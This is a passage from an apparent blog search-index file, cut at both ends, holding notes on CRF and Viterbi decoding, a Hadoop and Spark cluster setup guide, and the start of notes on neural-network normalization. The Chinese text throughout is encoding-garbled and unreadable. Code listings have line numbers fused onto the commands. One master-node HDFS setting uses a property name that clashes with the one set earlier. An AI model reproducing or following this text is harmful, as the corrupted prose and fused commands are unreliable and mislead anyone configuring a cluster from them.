æ·±åº¦æ¨¡å‹ä¸­çš„ä¼˜åŒ–ç›®æ ‡å®é™…å®ç°ä¸ºï¼š åˆ†å­è®¡ç®—å¯ä»¥ç®€å•è®¡ç®—å‘ç°ï¼Œå°±æ˜¯å½“å‰è·¯å¾„çš„Emission Scoreå’ŒTransition Scoreæ²¿è·¯å¾„ä¹‹å’Œã€‚è®¡ç®—éš¾ç‚¹åœ¨äºåˆ†æ¯ï¼Œå¯ä»¥é€šè¿‡é€’å½’å®ç°å…¶å¤šåˆ†æ”¯ç»“æ„è®¡ç®—ã€‚ é€’å½’è¿‡ç¨‹ï¼š ç»´æŠ¤ä¸¤ä¸ªè®°å½•åˆ—è¡¨ï¼šobså’Œ previousã€‚previouså­˜å‚¨äº†ä¹‹å‰æ­¥éª¤çš„ç»“æœï¼Œobsä»£è¡¨å½“å‰çŠ¶æ€å¯èƒ½çš„è¾“å‡ºé€‰æ‹©ã€‚ ä»¥step 0åˆ°step 1ä¸ºä¾‹ï¼š æ‰©å±•åˆ°#tagsç»´åº¦ï¼Œæ²¿ç€1è½´ï¼Œå’Œtransition matrixåŒç»´åº¦ å¯¹scoreçš„æ¯ä¸€åˆ—å–æŒ‡æ•°ï¼Œæ±‚å’Œï¼Œåœ¨å–å¯¹æ•°ï¼Œå¾—åˆ°æ–°çš„previous é€’å½’è®¡ç®—ï¼Œç›´åˆ°è¾¾åˆ°æœ€åä¸€ä¸ªæ—¶é—´æ­¥ã€‚ æ±‚å¾—åˆ†æ¯ æœ€ä½³è·¯å¾„å¯¼å‡ºViterbi åŠ¨æ€è§„åˆ’ç®—æ³•ï¼Œè¿‡ç¨‹ç±»ä¼¼lossä¸­æ±‚åˆ†æ¯çš„éƒ¨åˆ†ï¼Œä½†æ˜¯çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼ˆåŠ¨æ€è§„åˆ’ï¼‰ä¸åŒã€‚ åŒæ ·ä»¥step 0åˆ°step 1ä¸ºä¾‹ï¼š æ‰©å±•åˆ°#tagsç»´åº¦ï¼Œæ²¿ç€1è½´ï¼Œå’Œtransition matrixåŒç»´åº¦ previousä¿å­˜çš„ç´¯è®¡æœ€ä¼˜å¾—åˆ†çŠ¶æ€å˜åŒ–ä¸ºï¼š ç„¶åä¿å­˜è¿™ä¸€è½®çŠ¶æ€è½¬ç§»ä¸­ï¼Œä¸åŒstep 0çŠ¶æ€ä¸‹å¯¹åº”çš„æœ€ä¼˜å¾—åˆ†ï¼Œä»¥åŠæœ€ä¼˜å¾—åˆ†å¯¹åº”çš„step 1æœ€ä¼˜çŠ¶æ€ã€‚å³ï¼Œä¿å­˜ä¸¤ä¸ªåˆ—è¡¨ï¼Œåœ¨ä¸‹ä¸€æ¬¡è½¬ç§»æ—¶ï¼Œå°†æœ€ä¼˜å¾—åˆ†å’Œå¯¹åº”çš„æœ€ä¼˜çŠ¶æ€appendåˆ°ç»“æœä¸­ã€‚ æ ¹æ®æœ€åä¸€æ­¥çš„æœ€ä¼˜å¾—åˆ†ï¼Œå›æº¯é‡æ„å‡ºæœ€ä¼˜è·¯å¾„ã€‚ å¯¹æ¯”MEMM è™½ç„¶CRFåœ¨MEMMçš„åŸºç¡€ä¸Šï¼Œå»ºç«‹éšå˜é‡Xçš„æ¦‚ç‡æ— å‘å›¾è§£å†³äº†MEMMçš„å±€éƒ¨å½’ä¸€åŒ–é—®é¢˜ã€‚ä½†æ˜¯ï¼Œå¹¶ä¸æ˜¯è¯´MEMMçš„ç»“æœå°±ä¸€å®šå´©å¡Œã€‚ MEMMçš„ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹ç‚¹æ˜¯å®ç°ç®€å•ã€é€Ÿåº¦å¿«ï¼Œå› ä¸ºå®ƒåªéœ€è¦æ¯ä¸€æ­¥å•ç‹¬æ‰§è¡Œsoftmaxï¼Œæ‰€ä»¥MEMMæ˜¯å®Œå…¨å¯ä»¥å¹¶è¡Œçš„ï¼Œé€Ÿåº¦è·Ÿç›´æ¥é€æ­¥SoftmaxåŸºæœ¬ä¸€æ ·ã€‚ å®ƒçš„æ¯ä¸€æ­¥è®¡ç®—ï¼Œä¸éœ€è¦æ•´ä¸ªåºåˆ—çš„ä¿¡æ¯è®¡ç®—åˆ†æ¯ï¼Œè€Œæ˜¯ä¾èµ–äºä¸Šä¸€æ­¥çš„çŠ¶æ€ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"},{"name":"CRF","slug":"CRF","permalink":"https://racleray.github.io/tags/CRF/"}]},{"title":"hadoop+sparkç¯å¢ƒé…ç½®","slug":"hadoop-sparkç¯å¢ƒé…ç½®","date":"2020-10-30T08:56:36.000Z","updated":"2023-08-07T11:54:31.036Z","comments":true,"path":"posts/858c7a63.html","link":"","permalink":"https://racleray.github.io/posts/858c7a63.html","excerpt":"è®°å½• hadoop + spark çš„Linuxç¯å¢ƒé…ç½®ã€‚","text":"å•èŠ‚ç‚¹Hadoop 1.å®‰è£…JDK 12345sudo apt-get updatesudo apt-get install default-jdkjava -version æŸ¥çœ‹å®‰è£…è·¯å¾„ 1update-alternatives --display java 2.è®¾å®š SSHæ— å¯†ç ç™»å…¥ 123456sudo apt-get install sshsudo apt-get install rsyncssh-keygen -t dsa -P '' -f ~/.ssh/id_dsall ~/.ssh ä¸ºäº†æ— å¯†ç ç™»å½•æœ¬æœºï¼ŒåŠ å…¥å…¬åŒ™åˆ°è®¸å¯è¯æ–‡ä»¶ 1cat ~/.ssh/id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys 1systemctl restart sshd.service 3.ä¸‹è½½å®‰è£…Hadoop 1234567wget https://www.apache.org/dyn/closer.cgi/hadoop/common/hadoop-2.9.2/hadoop-2.9.2.tar.gzsudo tar -zxvf hadoop-2.9.2.tar.gzsudo mv hadoop-2.9.2 /usr/local/hadoopll /usr/local/hadoop 4.è®¾å®šHadoopç¯å¢ƒå˜æ•° ä¿®æ”¹~/.bashrc 1sudo gedit ~/.bashrc è¾“å…¥ä¸‹åˆ—å†…å®¹ 1234567891011121314export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64export HADOOP_HOME=/usr/local/hadoopexport PATH=$PATH:$HADOOP_HOME/binexport PATH=$PATH:$HADOOP_HOME/sbinexport HADOOP_MAPRED_HOME=$HADOOP_HOMEexport HADOOP_COMMON_HOME=$HADOOP_HOMEexport HADOOP_HDFS_HOME=$HADOOP_HOMEexport YARN_HOME=$HADOOP_HOMEexport HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/nativeexport HADOOP_OPTS=\"-Djava.library.path=$HADOOP_HOME/lib\"export JAVA_LIBRARY_PATH=$HADOOP_HOME/lib/native:$JAVA_LIBRARY_PATH è®©~/.bashrcä¿®æ”¹ç”Ÿæ•ˆ 1source ~/.bashrc 5.ä¿®æ”¹Hadoopç»„æ€è®¾å®šæ¡£ Step1 ä¿®æ”¹hadoop-env.shé…ç½®æ–‡ä»¶ 1sudo gedit /usr/local/hadoop/etc/hadoop/hadoop-env.sh è¾“å…¥ä¸‹åˆ—å†…å®¹: 1export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 Step2 ä¿®æ”¹core-site.xmlï¼Œè®¾ç½®HDFSåç§° 1sudo gedit /usr/local/hadoop/etc/hadoop/core-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 123456&lt;configuration&gt;&lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; Step3 ä¿®æ”¹yarn-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/yarn-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 12345678&lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services.mapreduce.shuffle.class&lt;/name&gt; &lt;value&gt;org.apache.hadoop.mapred.ShuffleHandler&lt;/value&gt;&lt;/property&gt; Step4 ä¿®æ”¹mapred-site.xmlï¼Œç›‘æ§Mapå’Œreduceç¨‹åºçš„JobTracker 1sudo cp /usr/local/hadoop/etc/hadoop/mapred-site.xml.template /usr/local/hadoop/etc/hadoop/mapred-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/mapred-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 1234&lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; Step5 ä¿®æ”¹hdfs-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/hdfs-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: dfs.replicationè®¾ç½®blocksåœ¨å…¶ä»–èŠ‚ç‚¹çš„å¤‡ä»½æ•°é‡ 12345678910111213141516&lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/namenode&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/datanode&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.http.address&lt;/name&gt; &lt;value&gt;0.0.0.0:50070&lt;/value&gt;&lt;/property&gt; 6.å»ºç«‹ä¸æ ¼å¼åŒ–HDFS ç›®å½• 1sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/namenode 1sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode 1sudo chown ray:ray -R /usr/local/hadoop chownè¦æ ¹æ®å½“å‰ç”¨æˆ·åè¿›è¡Œä¿®æ”¹ æ ¼å¼åŒ– 1hadoop namenode -format 7.å¯åŠ¨Hadoop å¯åŠ¨start-dfs.shï¼Œå†å¯åŠ¨ start-yarn.sh 123start-dfs.shstart-yarn.sh æˆ– å¯åŠ¨å…¨éƒ¨ 1start-all.sh æŸ¥çœ‹ç›®å‰æ‰€æ‰§è¡Œçš„è¡Œç¨‹ 1jps stop-dfs.sh stop-yarn.sh stop-all.sh 8.å¼€å¯Hadoop ResourceÂ­ManagerWebæ¥å£ Hadoop ResourceÂ­Manager Webæ¥å£ç½‘å€ http://localhost:8088/ image 9.NameNode HDFS Webæ¥å£ å¼€å¯HDFS Web UIç½‘å€ http://localhost:50070/ image å¤šèŠ‚ç‚¹Hadoop ç”±å¤šå°ç”µè„‘ç»„æˆ:æœ‰ä¸€å°ä¸»è¦çš„ç”µè„‘masterï¼Œåœ¨HDFSæ‹…ä»»NameNodeè§’è‰²ï¼Œåœ¨MapReduce2(YARN)æ‹…ä»»ResourceManagerè§’è‰² æœ‰å¤šå°çš„ç”µè„‘data1ã€data2ã€data3ï¼Œåœ¨HDFSæ‹…ä»»DataNodeè§’è‰²ï¼Œåœ¨MapReduce2(YARN)æ‹…ä»»NodeManagerè§’è‰² Hadoop Multi NodeClusterè§„åˆ’ï¼Œæ•´ç†å¦‚ä¸‹è¡¨æ ¼: ä¼ºæœå™¨åç§° IP HDFS YARN master 192.168.0.100 NameNode ResourceManager data1 192.168.0.101 DataNode NodeManager data2 192.168.0.102 DataNode NodeManager data3 192.168.0.103 DataNode NodeManager 1å¤åˆ¶Single Node Clusteråˆ°data1 å°†ä¹‹å‰æ‰€å»ºç«‹çš„Single Node Cluster VirtualBox hadoopè™šæ‹Ÿæœºå™¨å¤åˆ¶åˆ°data1 2è®¾å®šdata1ä¼ºæœå™¨ ç¼–è¾‘ç½‘è·¯è®¾å®šæ¡£è®¾å®šå›ºå®šIP 1sudo gedit /etc/network/interfaces è¾“å…¥ä¸‹åˆ—å†…å®¹ : 123456789101112# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.101netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 1sudo vim /etc/NetworkManager/NetworkManager.conf å°†managed=falseä¿®æ”¹æˆmanaged=true 1sudo service network-manager restart é‡å¯ è®¾å®šhostname 1sudo gedit /etc/hostname è¾“å…¥ä¸‹åˆ—å†…å®¹: 1data1 è®¾å®šhostsæ¡£æ¡ˆ 1sudo gedit /etc/hosts 12345678910111213127.0.0.1 localhost127.0.1.1 hadoop192.168.0.100 master192.168.0.101 data1192.168.0.102 data2192.168.0.103 data3# The following lines are desirable for IPv6 capable hosts::1 ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters ä¿®æ”¹core-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/core-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 1234&lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://master:9000&lt;/value&gt; &lt;/property&gt; ä¿®æ”¹yarn-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/yarn-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 123456789101112&lt;property&gt; &lt;name&gt;yarn.resourcemanager.resource-tracker.address&lt;/name&gt; &lt;value&gt;master:8025&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.scheduler.address&lt;/name&gt; &lt;value&gt;master:8030&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.address&lt;/name&gt; &lt;value&gt;master:8050&lt;/value&gt; &lt;/property&gt; ä¿®æ”¹mapred-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop /mapred-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 1234&lt;property&gt; &lt;name&gt;mapred.job.tracker&lt;/name&gt; &lt;value&gt;master:54311&lt;/value&gt; &lt;/property&gt; ä¿®æ”¹hdfs-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/hdfs-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 12345678&lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/datanode&lt;/value&gt; &lt;/property&gt; 3å¤åˆ¶data1ä¼ºæœå™¨è‡³data2ã€data3ã€master 4è®¾å®šdata2ã€data3ä¼ºæœå™¨ è®¾å®šdata2å›ºå®šIP 1sudo gedit /etc/network/interfaces è¾“å…¥ä¸‹åˆ—å†…å®¹ 1234567891011# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.102netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 è®¾å®šhostname 1sudo gedit /etc/hostname è¾“å…¥ä¸‹åˆ—å†…å®¹: 1data2 è®¾å®šdata3å›ºå®šIP 1sudo gedit /etc/network/interfaces è¾“å…¥ä¸‹åˆ—å†…å®¹ 1234567891011# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.103netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 è®¾å®šhostname 1sudo gedit /etc/hostname è¾“å…¥ä¸‹åˆ—å†…å®¹: 1data3 5è®¾å®šmasterä¼ºæœå™¨ è®¾å®šmasterå›ºå®šIP 1sudo gedit /etc/network/interfaces è¾“å…¥ä¸‹åˆ—å†…å®¹ 1234567891011# interfaces(5) file used by ifup(8) and ifdown(8)auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.0.100netmask 255.255.255.0network 192.168.0.0gateway 192.168.0.1dns-nameservers 192.168.0.1 è®¾å®šhostname 1sudo gedit /etc/hostname è¾“å…¥ä¸‹åˆ—å†…å®¹: 1master ä¿®æ”¹hdfs-site.xml 1sudo gedit /usr/local/hadoop/etc/hadoop/hdfs-site.xml åœ¨ä¹‹é—´ï¼Œè¾“å…¥ä¸‹åˆ—å†…å®¹: 12345678&lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;3&lt;/value&gt; &lt;/property&gt;&lt;property&gt; &lt;name&gt;dfs.namenode.data.dir&lt;/name&gt; &lt;value&gt;file:/usr/local/hadoop/hadoop_data/hdfs/namenode&lt;/value&gt; &lt;/property&gt; è®¾å®šmasteræ¡£æ¡ˆ 1sudo gedit /usr/local/hadoop/etc/hadoop/master è¾“å…¥ä¸‹åˆ—å†…å®¹: 1master è®¾å®šslavesæ¡£æ¡ˆ 1sudo gedit /usr/local/hadoop/etc/hadoop/slaves è¾“å…¥ä¸‹åˆ—å†…å®¹: 123data1data2data3 6 masterè¿çº¿è‡³data1ã€data2ã€data3å»ºç«‹HDFSç›®å½• master SSHè¿çº¿è‡³data1å¹¶å»ºç«‹HDFSç›®å½• 12345678910ssh data1# åˆ é™¤hdfsç›®å½•sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# åˆ›å»ºdatanodeç›®å½•sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode# æ›´æ”¹æ‰€æœ‰è€…ä¸ºå½“å‰ç”¨æˆ·sudo chown ray:ray -R /usr/local/hadoop å›åˆ°masterç«¯ 1exit master SSHè¿çº¿è‡³data2å¹¶å»ºç«‹HDFSç›®å½• 12345678910ssh data2# åˆ é™¤hdfsç›®å½•sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# åˆ›å»ºdatanodeç›®å½•sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode# æ›´æ”¹æ‰€æœ‰è€…ä¸ºå½“å‰ç”¨æˆ·sudo chown ray:ray -R /usr/local/hadoop å›åˆ°masterç«¯ 1exit master SSHè¿çº¿è‡³data3å¹¶å»ºç«‹HDFSç›®å½• 12345678910ssh data3# åˆ é™¤hdfsç›®å½•sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# åˆ›å»ºdatanodeç›®å½•sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/datanode# æ›´æ”¹æ‰€æœ‰è€…ä¸ºå½“å‰ç”¨æˆ·sudo chown ray:ray -R /usr/local/hadoop å›åˆ°masterç«¯ 1exit 7å»ºç«‹ä¸æ ¼å¼åŒ–NameNode HDFSç›®å½• 12345678# åˆ é™¤hdfsç›®å½•sudo rm -rf /usr/local/hadoop/hadoop_data/hdfs# åˆ›å»ºdatanodeç›®å½•sudo mkdir -p /usr/local/hadoop/hadoop_data/hdfs/namenode# æ›´æ”¹æ‰€æœ‰è€…ä¸ºå½“å‰ç”¨æˆ·sudo chown ray:ray -R /usr/local/hadoop æ ¼å¼åŒ–NameNode HDFSç›®å½• 1hadoop namenode -format 8å¯åŠ¨Hadoop Multi Node cluster å¯åŠ¨start-dfs.shï¼Œå†å¯åŠ¨ start-yarn.sh 123start-dfs.shstart-yarn.sh æˆ– å¯åŠ¨å…¨éƒ¨ 1start-all.sh æŸ¥çœ‹ç›®å‰æ‰€æ‰§è¡Œçš„è¡Œç¨‹ 1jps åœæ­¢ stop-dfs.sh stop-yarn.sh stop-all.sh 9å¼€å¯Hadoop Resource-Manager Webä»‹é¢ http://master:8088/ image 10å¼€å¯NameNodeWebä»‹é¢ HDFS Web UIç½‘å€ http://master:50070/ image image å¸¸ç”¨å‘½ä»¤ 123456789hadoop fs -mkdirhadoop fs -lshadoop fs -copyFromLocal # å¤åˆ¶åˆ°hdfsï¼Œæé†’æœ‰é‡åhadoop fs -put # å¤åˆ¶åˆ°hdfsï¼Œä½†æ˜¯ç›´æ¥è¦†ç›–é‡åhadoop fs -cathadoop fs -copyToLocal # å¤åˆ¶åˆ°æœ¬åœ°ï¼Œæé†’æœ‰é‡åhadoop fs -get # å¤åˆ¶åˆ°æœ¬åœ°ï¼Œä½†æ˜¯ç›´æ¥è¦†ç›–é‡åhadoop fs -cphadoop fs -rm pyspark scale 12345tar xvf scala-2.11.12.tgzsudo mv scala-2.11.12 /usr/local/scalasudo gedit .bashrc 123# å†™å…¥export SCALA_HOME=/usr/local/scalaexport PATH=$PATH:$SCALA_HOME/bin spark 123tar xvf spark-2.4.7-bin-without-hadoop.tgz sudo mv spark-2.4.7-bin-without-hadoop /usr/local/sparksudo gedit .bashrc å†™å…¥ 12export SPARK_HOME=/usr/local/sparkexport PATH=$PATH:$SPARK_HOME/bin:$SPARK_HOME/sbin 1source .bashrc 1234cd /usr/local/spark/cp ./conf/spark-env.sh.template ./conf/spark-env.shsudo gedit ./conf/spark-env.sh å†™å…¥ 1234567export SPARK_DIST_CLASSPATH=$(/usr/local/hadoop/bin/hadoop classpath)export HADOOP_CONF_DIR=/usr/local/hadoop/etc/hadoopexport PYSPARK_PYTHON=/usr/bin/python3export PYSPARK_DRIVER_PYTHON=/usr/bin/ipython3# åœ¨notebookä¸­è¿è¡Œpyspark# export PYSPARK_DRIVER_PYTHON_OPTS=\"notebook\" ä½¿ç”¨HDFSä¸­æ–‡ä»¶æ—¶ï¼Œå…ˆè¦å¯åŠ¨Hadoop æµ‹è¯• masteræœºå™¨ä¸Š 123cd ~mkdir wordcount/input -pcp /usr/local/hadoop/LICENSE.txt ~/wordcount/input 1start-all.sh 1234hadoop fs -mkdir -p /user/ray/wordcount/inputcd ~/wordcount/inputhadoop fs -copyFromLocal LICENSE.txt /user/ray/wordcount/inputhadoop fs -ls /user/ray/wordcount/input","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"spark","slug":"Tools/spark","permalink":"https://racleray.github.io/categories/Tools/spark/"}],"tags":[{"name":"spark","slug":"spark","permalink":"https://racleray.github.io/tags/spark/"},{"name":"tools","slug":"tools","permalink":"https://racleray.github.io/tags/tools/"}]},{"title":"ç¥ç»ç½‘ç»œnormalization","slug":"ç¥ç»ç½‘ç»œnormalization","date":"2020-10-19T11:32:28.000Z","updated":"2024-11-14T13:09:59.856Z","comments":true,"path":"posts/5de6e8e6.html","link":"","permalink":"https://racleray.github.io/posts/5de6e8e6.html","excerpt":"è®°å½•Normalizationç›¸å…³æ–¹æ³•ï¼Œä»¥åŠä¸€ç‚¹ç‚¹æ€è€ƒã€‚","text":"æ·±åº¦å­¦ä¹ ä¸­çš„Normalizationï¼ŒBN/LN/WN ä¸ºä»€ä¹ˆéœ€è¦ Normalization independent and identically distributedï¼Œç®€ç§°ä¸º i.i.d å¹¶éæ‰€æœ‰æœºå™¨å­¦ä¹ æ¨¡å‹çš„å¿…ç„¶è¦æ±‚ï¼ˆæ¯”å¦‚ Naive Bayes æ¨¡å‹å°±å»ºç«‹åœ¨ç‰¹å¾å½¼æ­¤ç‹¬ç«‹çš„åŸºç¡€ä¹‹ä¸Šï¼Œè€ŒLogistic Regression å’Œ ç¥ç»ç½‘ç»œ åˆ™åœ¨éç‹¬ç«‹çš„ç‰¹å¾æ•°æ®ä¸Šä¾ç„¶å¯ä»¥è®­ç»ƒå‡ºå¾ˆå¥½çš„æ¨¡å‹ï¼‰ï¼Œä½†ç‹¬ç«‹åŒåˆ†å¸ƒçš„æ•°æ®å¯ä»¥ç®€åŒ–å¸¸è§„æœºå™¨å­¦ä¹ æ¨¡å‹çš„è®­ç»ƒã€æå‡æœºå™¨å­¦ä¹ æ¨¡å‹çš„é¢„æµ‹èƒ½åŠ›ï¼Œå·²ç»æ˜¯ä¸€ä¸ªå…±è¯†ã€‚ ç™½åŒ–ï¼ˆwhiteningï¼‰ æ•°æ®é¢„å¤„ç†æ­¥éª¤ã€‚ ï¼ˆ1ï¼‰å»é™¤ç‰¹å¾ä¹‹é—´çš„ç›¸å…³æ€§ â€”&gt; ç‹¬ç«‹ï¼› ï¼ˆ2ï¼‰ä½¿å¾—æ‰€æœ‰ç‰¹å¾å…·æœ‰ç›¸åŒçš„å‡å€¼å’Œæ–¹å·® â€”&gt; åŒåˆ†å¸ƒã€‚ æ·±åº¦å­¦ä¹ ä¸­çš„ Internal Covariate Shift å‚æ•°æ›´æ–°ä½¿æ¯ä¸€å±‚çš„æ•°æ®åˆ†å¸ƒå‘ç”Ÿå˜åŒ–ï¼Œå‘å‰å åŠ ï¼Œé«˜å±‚çš„å—åˆ°æ•°æ®å˜åŒ–çš„å½±å“ï¼Œéœ€è¦ä¸æ–­é‡æ–°é€‚åº”åº•å±‚çš„æ•°æ®å˜åŒ–ã€‚ Internal Covariate Shiftï¼Œç®€ç§° ICS. MLç»å…¸å‡è®¾æ˜¯â€œæºç©ºé—´ï¼ˆsource domainï¼‰å’Œç›®æ ‡ç©ºé—´ï¼ˆtarget domainï¼‰çš„æ•°æ®åˆ†å¸ƒï¼ˆdistributionï¼‰æ˜¯ä¸€è‡´çš„â€ covariate shiftæ˜¯æŒ‡æºç©ºé—´å’Œç›®æ ‡ç©ºé—´çš„æ¡ä»¶æ¦‚ç‡æ˜¯ä¸€è‡´çš„ï¼Œä½†æ˜¯å…¶è¾¹ç¼˜æ¦‚ç‡ä¸åŒ â€‹ 1. ç»™å®šè¾“å…¥ï¼Œæ‹Ÿåˆlabelï¼Œæ¡ä»¶æ¦‚ç‡ä¸€è‡´çš„ å±‚é—´è®¡ç®—å¯¼è‡´ï¼Œå„å±‚åˆ†å¸ƒå‘ç”Ÿæ”¹å˜ï¼Œè¾¹ç¼˜æ¦‚ç‡æ˜¯ä¸åŒçš„ ICSçš„é—®é¢˜ ä¸Šå±‚å‚æ•°éœ€è¦ä¸æ–­é€‚åº”æ–°çš„è¾“å…¥æ•°æ®åˆ†å¸ƒï¼Œé™ä½å­¦ä¹ é€Ÿåº¦ ä¸‹å±‚è¾“å…¥çš„å˜åŒ–å¯èƒ½è¶‹å‘äºå˜å¤§æˆ–è€…å˜å°ï¼Œå¯¼è‡´ä¸Šå±‚è½å…¥é¥±å’ŒåŒºï¼Œä½¿å¾—å­¦ä¹ è¿‡æ—©åœæ­¢ (æƒ³æƒ³sigmoid) æ¯å±‚çš„æ›´æ–°éƒ½ä¼šå½±å“åˆ°å…¶å®ƒå±‚ï¼Œå› æ­¤æ¯å±‚çš„å‚æ•°æ›´æ–°ç­–ç•¥éœ€è¦å°½å¯èƒ½çš„è°¨æ… Normalization çš„é€šç”¨æ¡†æ¶ä¸åŸºæœ¬æ€æƒ³ æ ‡å‡†çš„ç™½åŒ–æ“ä½œä»£ä»·é«˜æ˜‚ï¼Œç‰¹åˆ«æ˜¯æˆ‘ä»¬è¿˜å¸Œæœ›ç™½åŒ–æ“ä½œæ˜¯å¯å¾®çš„ï¼ˆæ¯ä¸€ç‚¹ä¸Šå¿…å­˜åœ¨éå‚ç›´åˆ‡çº¿ï¼‰ï¼Œä¿è¯ç™½åŒ–æ“ä½œå¯ä»¥é€šè¿‡åå‘ä¼ æ’­æ¥æ›´æ–°æ¢¯åº¦ã€‚ Normalization æ–¹æ³•é€€è€Œæ±‚å…¶æ¬¡ï¼Œè¿›è¡Œäº†ç®€åŒ–çš„ç™½åŒ–æ“ä½œã€‚ Normalization å…ˆå¯¹å…¶åšå¹³ç§»å’Œä¼¸ç¼©å˜æ¢ï¼Œ å°† çš„åˆ†å¸ƒè§„èŒƒåŒ–æˆåœ¨å›ºå®šåŒºé—´èŒƒå›´çš„æ ‡å‡†åˆ†å¸ƒã€‚ æ˜¯å¹³ç§»å‚æ•°ï¼ˆshift parameterï¼‰ï¼Œ æ˜¯ç¼©æ”¾å‚æ•°ï¼ˆscale parameterï¼‰ æ˜¯å†å¹³ç§»å‚æ•°ï¼ˆre-shift parameterï¼‰ï¼Œ æ˜¯å†ç¼©æ”¾å‚æ•°ï¼ˆre-scale parameterï¼‰ æœ€ç»ˆå¾—åˆ°çš„æ•°æ®ç¬¦åˆå‡å€¼ä¸º ã€æ–¹å·®ä¸º çš„åˆ†å¸ƒ å˜æ¢ä¸ºå‡å€¼ä¸º ã€æ–¹å·®ä¸º çš„åˆ†å¸ƒï¼Œä¹Ÿå¹¶ä¸æ˜¯ä¸¥æ ¼çš„åŒåˆ†å¸ƒï¼Œåªæ˜¯æ˜ å°„åˆ°äº†ä¸€ä¸ªç¡®å®šçš„åŒºé—´èŒƒå›´è€Œå·² å†å¹³ç§»è°ƒæ•´çš„æ„ä¹‰ ä¸ä¼šè¿‡åˆ†æ”¹å˜æ¯ä¸€å±‚è®¡ç®—ç»“æœ ç¬¬ä¸€æ­¥çš„è§„èŒƒåŒ–ä¼šå°†å‡ ä¹æ‰€æœ‰æ•°æ®æ˜ 